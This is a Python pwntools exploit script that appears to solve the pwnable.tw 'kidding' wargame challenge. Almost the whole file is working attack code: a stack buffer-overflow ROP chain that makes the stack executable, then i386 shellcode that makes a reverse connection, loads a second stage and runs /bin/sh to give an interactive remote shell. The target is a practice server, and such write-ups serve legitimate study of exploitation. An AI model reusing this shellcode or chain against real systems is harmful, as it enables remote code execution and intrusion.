#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys

def conn():
	local = 0
	debug = 0

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./kidding')
		if debug:
			gdb.attach(s, gdbscript='''
				b*0x080488B5
				b*0x080bd13b
				c
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('chall.pwnable.tw', 10303)

	return s

s = conn()

elf = ELF('kidding')

pop_3 = 0x0804847e
bss = 0x80e9000
buf = 0x080EAFB4
jmp_esp = 0x080bd13b
mov_medx_eax = 0x0805462b
pop_eax = 0x080b8536
pop_edx = 0x0806ec8b

# i use 127.0.0.1 and port 10000

back_connect = asm('\n'.join([
    'xor eax, eax',
    'xor ebx, ebx',
    'xor ecx, ecx',
    'xor edx, edx',
    'mov bl, 2',
    'inc ecx',
    'mov ax, 0x167',
    'int 0x80',
    'push eax',
    'pop ebx',   
    'mov dl, 16',       
    'push 0x0100007f',
    'push 0x10270002',
    'push esp',
    'pop ecx',
    'mov ax, 0x16a',
    'int 0x80'    
]), arch = 'i386', os = 'linux')

read_next = asm('\n'.join([
	'mov dl, 0xff',
    'xor eax, eax',
    'mov al, 3',
    'int 0x80'
]), arch = 'i386', os = 'linux')

dup2 = asm('\n'.join([
    'xor ecx, ecx',
    'inc ecx',
    'mov al, 0x3f',
    'int 0x80'

]), arch = 'i386', os = 'linux')

shellcode = asm('\n'.join([
    'xor eax, eax',
    'xor ecx, ecx',
    'xor edx, edx',
    'push eax',
    'push 0x68732f2f',
    'push 0x6e69622f',
    'push esp',
    'pop ebx',
    'mov al, 0xb',
    'int 0x80'

]), arch = 'i386', os = 'linux')

payload = b'A' * 0xc
payload += p32(pop_edx) + p32(elf.symbols['__stack_prot'])
payload += p32(pop_eax) + p32(7) + p32(0x0805462b)
payload += p32(pop_eax) + p32(elf.symbols['__libc_stack_end'])
payload += p32(elf.symbols['_dl_make_stack_executable'])
payload += p32(jmp_esp)
payload += back_connect
payload += read_next

assert(len(payload) <= 100 and b'\n' not in payload)

l = listen(10000)

s.sendline(payload)
l.wait_for_connection()

payload = b'A' * 0x37 + dup2 + shellcode

assert(len(payload) <= 0xff)

l.sendline(payload)

l.interactive()
